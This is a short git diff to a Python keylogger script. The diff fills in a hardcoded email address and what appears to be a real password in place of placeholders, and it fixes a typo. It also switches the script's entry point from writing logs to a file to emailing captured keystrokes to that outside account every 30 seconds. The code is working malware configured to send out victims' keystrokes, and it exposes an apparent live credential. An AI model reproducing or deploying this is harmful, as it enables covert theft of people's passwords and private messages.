@@ -10,8 +10,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 send_report_interval = 30
-email_address = "your_email"
-email_password = "your_password"
+email_address = "bluePhobic@outlook.com"
+email_password = "=SqbShv8N7c2C*)"
 
 class Keylogger: 
 	def __init__(self, interval, report_method="email"):
@@ -108,7 +108,7 @@ class Keylogger:
 		server.quit()
 		
 		if verbose:
-			print(f"{datetime.now()} - Sent an email to {email} constaining: {message}")
+			print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
 			
 	def report(self):
 	# sends key logs and resets self.log variable
@@ -139,6 +139,6 @@ class Keylogger:
 		
 		
 if __name__ == "__main__":
-	#keylogger = Keylogger(interval=send_report_interval, report_method="email")
-	keylogger = Keylogger(interval=send_report_interval, report_method="file")
+	keylogger = Keylogger(interval=send_report_interval, report_method="email")
+	#keylogger = Keylogger(interval=send_report_interval, report_method="file")
 	keylogger.start()
